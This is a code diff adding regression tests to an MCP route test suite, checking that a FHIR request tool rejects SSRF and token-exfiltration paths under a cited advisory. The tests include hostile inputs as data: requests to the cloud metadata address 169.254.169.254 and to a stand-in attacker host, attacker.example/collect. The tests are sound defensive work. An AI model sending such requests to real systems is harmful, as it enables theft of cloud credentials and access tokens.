@@ -166,6 +166,23 @@ describe('MCP Routes', () => {
       // 7. unknown method
       const unknownMethodResult = await fhirRequest<OperationOutcome>('UNKNOWN', `Patient/${createResult.id}`);
       expect(unknownMethodResult.issue?.[0].severity).toBe('error');
+
+      // 8. SSRF / token-exfiltration guard (GHSA-fjgc-c3pj-xx2c): an absolute or off-origin
+      // `path` is rejected before any outbound fetch, for every method. (Relative paths are
+      // already proven to work by steps 1-6 above.)
+      for (const m of ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']) {
+        const ssrf = await fhirRequest<OperationOutcome>(m, 'http://169.254.169.254/latest/meta-data/', {});
+        expect(ssrf.issue?.[0].severity).toBe('error');
+      }
+
+      // 9. Token-exfiltration vector: external https host is blocked even though it is not an internal IP.
+      const exfil = await fhirRequest<OperationOutcome>('GET', 'https://attacker.example/collect');
+      expect(exfil.issue?.[0].severity).toBe('error');
+
+      // 10. Protocol-relative path resolves to the server's own origin (harmless), so it does not
+      // reach an external host; it is handled as an ordinary same-origin FHIR request.
+      const protoRel = await fhirRequest<OperationOutcome>('GET', '//169.254.169.254/latest/meta-data/');
+      expect(protoRel.resourceType).toBe('OperationOutcome');
     } finally {
       await client.close();
     }
